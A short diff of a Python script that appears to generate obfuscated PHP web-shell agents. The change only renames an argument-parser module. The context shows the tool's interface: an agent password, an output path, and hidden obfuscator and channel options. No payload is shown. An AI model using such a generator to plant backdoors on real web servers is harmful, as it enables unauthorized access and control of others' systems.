@@ -6,7 +6,7 @@ from mako.template import Template
 from core.weexceptions import FatalException
 from core.loggers import log
 from core.config import agent_templates_folder_path, obfuscators_templates_folder_path
-from core import helpparse
+from core import argparsers
 from core import messages
 import utils
 import os
@@ -72,18 +72,18 @@ if __name__ == '__main__':
     ]
 
     # HelpParser is a slightly changed `ArgumentParser`
-    argparser = helpparse.HelpParser(description = __doc__)
+    argparser = argparsers.HelpParser(description = __doc__)
     argparser.add_argument('password', help = 'The agent password')
     argparser.add_argument('path', help = 'Where save the generated agent')
     argparser.add_argument(
         '-obfuscator',
-        help = helpparse.SUPPRESS, #The obfuscation method
+        help = argparsers.SUPPRESS, #The obfuscation method
         choices = obfuscators_available,
         default = 'obfusc1_php'
         )
     argparser.add_argument(
         '-agent',
-        help = helpparse.SUPPRESS, #The agent channel type
+        help = argparsers.SUPPRESS, #The agent channel type
         choices = agents_available,
         default = 'stegaref_php'
         )
